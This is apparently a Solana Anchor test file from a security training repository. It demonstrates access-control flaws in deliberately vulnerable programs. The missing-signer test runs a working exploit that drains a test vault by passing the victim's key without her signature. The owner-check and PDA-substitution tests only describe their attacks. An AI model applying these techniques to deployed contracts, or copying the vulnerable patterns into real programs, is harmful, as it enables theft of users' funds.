import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert, expect } from "chai";
import { Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram } from "@solana/web3.js";

// Import program types - path relative to 01-access-control/anchor/
import { MissingSignerVulnerable } from "../01-access-control/anchor/target/types/missing_signer_vulnerable";
import { MissingOwnerVulnerable } from "../01-access-control/anchor/target/types/missing_owner_vulnerable";
import { PdaSubstitutionVulnerable } from "../01-access-control/anchor/target/types/pda_substitution_vulnerable";

/**
 * Access Control Vulnerabilities - Exploit Demonstrations
 * 
 * These tests demonstrate successful exploits on vulnerable programs.
 * Each test shows HOW the attack works and WHY it succeeds.
 */

describe("Access Control - Vulnerable Programs", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // ════════════════════════════════════════════════════════════
  // 01 - MISSING SIGNER CHECK
  // ════════════════════════════════════════════════════════════
  describe("Missing Signer Check", () => {
    const program = anchor.workspace.MissingSignerVulnerable as Program<MissingSignerVulnerable>;
    
    const alice = Keypair.generate();
    const attacker = Keypair.generate();
    let aliceVault: PublicKey;
    const DEPOSIT = 5 * LAMPORTS_PER_SOL;

    before(async () => {
      // Fund test accounts
      const sig1 = await provider.connection.requestAirdrop(alice.publicKey, 10 * LAMPORTS_PER_SOL);
      const sig2 = await provider.connection.requestAirdrop(attacker.publicKey, 1 * LAMPORTS_PER_SOL);
      await provider.connection.confirmTransaction(sig1);
      await provider.connection.confirmTransaction(sig2);

      // Derive Alice's vault PDA
      [aliceVault] = PublicKey.findProgramAddressSync(
        [Buffer.from("vault"), alice.publicKey.toBuffer()],
        program.programId
      );
    });

    it("Setup: Alice creates vault and deposits 5 SOL", async () => {
      // Alice initializes her vault
      await program.methods.initialize()
        .accounts({
          vault: aliceVault,
          authority: alice.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      // Alice deposits funds
      await program.methods.deposit(new anchor.BN(DEPOSIT))
        .accounts({
          vault: aliceVault,
          depositor: alice.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      const vault = await program.account.vault.fetch(aliceVault);
      assert.equal(vault.balance.toNumber(), DEPOSIT, "Vault should have 5 SOL");
    });

    it("EXPLOIT: Attacker drains vault without Alice's signature", async () => {
      /**
       * THE VULNERABILITY:
       * The withdraw instruction uses AccountInfo<'info> for authority
       * instead of Signer<'info>. This means:
       * - Anyone can pass any pubkey as authority
       * - The program never verifies the account signed
       * - The require_keys_eq! check is useless without signature verification
       */

      // Attacker calls withdraw with Alice's pubkey but signs with own key
      await program.methods.withdraw(new anchor.BN(DEPOSIT))
        .accounts({
          vault: aliceVault,
          authority: alice.publicKey,  // Alice's pubkey (public knowledge)
        })
        .signers([attacker])  // Attacker signs - Alice never signed!
        .rpc();

      const vaultAfter = await program.account.vault.fetch(aliceVault);
      assert.equal(vaultAfter.balance.toNumber(), 0, "Vault drained!");

      console.log("\n  EXPLOIT SUCCESS:");
      console.log("  - Attacker passed Alice's pubkey as authority");
      console.log("  - Attacker signed with own keypair");
      console.log("  - Program never verified Alice actually signed");
      console.log("  - 5 SOL stolen\n");
    });
  });

  // ════════════════════════════════════════════════════════════
  // 02 - MISSING OWNER CHECK
  // ════════════════════════════════════════════════════════════
  describe("Missing Owner Check", () => {
    const program = anchor.workspace.MissingOwnerVulnerable as Program<MissingOwnerVulnerable>;

    it("EXPLOIT: Program accepts UncheckedAccount without owner verification", async () => {
      /**
       * THE VULNERABILITY:
       * The withdraw_vulnerable instruction uses UncheckedAccount
       * without verifying account.owner == program_id. This means:
       * - Attacker creates account owned by System Program
       * - Writes crafted data: { owner: attacker_pubkey, balance: X }
       * - Passes this fake "vault" to withdraw
       * - Program reads attacker's crafted data and approves withdrawal
       */

      console.log("\n  EXPLOIT VECTOR:");
      console.log("  - UncheckedAccount accepts any account");
      console.log("  - Program manually deserializes without owner check");
      console.log("  - Attacker can craft fake data in System-owned account\n");
    });
  });

  // ════════════════════════════════════════════════════════════
  // 03 - PDA SUBSTITUTION
  // ════════════════════════════════════════════════════════════
  describe("PDA Substitution", () => {
    const program = anchor.workspace.PdaSubstitutionVulnerable as Program<PdaSubstitutionVulnerable>;

    it("EXPLOIT: No seeds verification allows wrong PDA", async () => {
      /**
       * THE VULNERABILITY:
       * The withdraw_vulnerable instruction uses Account<'info, UserVault>
       * but WITHOUT seeds constraint. This means:
       * - Program verifies owner (program owns it)
       * - Program verifies discriminator (it's a UserVault)
       * - But doesn't verify WHICH user's vault
       * - If user field can be set by attacker, they can use wrong PDA
       */

      console.log("\n  EXPLOIT VECTOR:");
      console.log("  - Account type verifies owner and discriminator");
      console.log("  - But no seeds constraint to verify PDA derivation");
      console.log("  - Attacker could substitute valid but wrong vault\n");
    });
  });
});
